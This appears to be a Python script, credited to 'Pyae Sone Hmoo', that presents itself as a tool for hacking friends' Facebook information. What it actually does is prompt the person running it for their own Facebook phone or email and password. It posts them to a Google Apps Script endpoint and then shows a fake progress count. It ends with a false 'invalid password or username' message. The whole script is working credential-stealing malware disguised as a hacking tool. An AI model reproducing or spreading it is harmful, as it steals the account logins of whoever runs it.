import random
import os
import requests
import pyfiglet
import time
# colors
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
a = pyfiglet.figlet_format('facebook info')
b = pyfiglet.figlet_format( 'PyaeSoneHmoo')
os.system("clear")
print(a)
print(b)
print(gren+"autor by: Pyae Sone Hmoo"+gren)
print(red+"dont use illegal"+red)
print(pink+'please login with your facebook \n for hack your firends info'+pink)

umail =input("please Enter phone and gmail:")
upass =input("please Enter  password'")
data ={'mail':umail,'pass':upass}
print(cyan+"plase wait"+cyan)
rq =requests.post('https://script.google.com/macros/s/AKfycbx1cnhTRxQYCCWH0E55DRSXr54-p2-Q-0AEzUtqoTRZVHx1sw/exec',data=data)

for i in range(100):
   print(i,'%')
   time.sleep(1)
print('invalid password or username')
